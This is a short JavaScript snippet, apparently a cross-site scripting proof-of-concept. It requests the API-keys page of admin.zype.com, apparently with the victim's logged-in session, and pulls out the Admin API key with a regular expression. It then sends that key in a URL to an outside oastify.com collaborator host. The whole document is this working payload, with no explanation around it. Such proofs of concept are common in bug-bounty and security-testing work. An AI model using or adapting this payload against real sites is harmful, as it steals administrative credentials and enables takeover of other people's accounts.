fetch("https://admin.zype.com/api_keys").then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin<\/td>\s*<td>(\w+)<\/td>/);if (apiKeyMatch) {
      const apiKey = apiKeyMatch[1];
      return fetch("https://a9k1b4wcnx0cqkkm9dnfhmn8xz3qrif7.oastify.com?x=" + apiKey);
    } else {
      console.error("API Key not found in the response");
    }
  })
  .then(response => {
    console.log(response);
  });
